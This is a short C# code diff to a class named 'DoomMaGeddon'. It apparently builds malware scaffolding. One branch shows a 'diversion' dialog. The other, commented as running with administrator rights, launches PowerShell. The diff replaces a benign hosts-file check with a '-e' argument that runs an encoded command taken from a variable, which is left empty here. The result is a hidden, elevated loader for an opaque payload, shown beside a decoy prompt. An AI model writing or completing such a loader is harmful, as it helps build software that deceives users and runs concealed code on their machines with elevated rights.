@@ -11,11 +11,12 @@ class DoomMaGeddon
             DiversionPrompt dp = new DiversionPrompt();
             dp.ShowDialog();
         } else {
+            string l = "";
             // runs as administrator
             ProcessStartInfo psi = new ProcessStartInfo
             {
                 FileName = "powershell.exe",
-                Arguments = @"-NoExit -Command 'Test-Path C:\Windows\System32\drivers\etc\hosts'",
+                Arguments = "-e " + l,
                 UseShellExecute = true
             };
             Process.Start(psi);
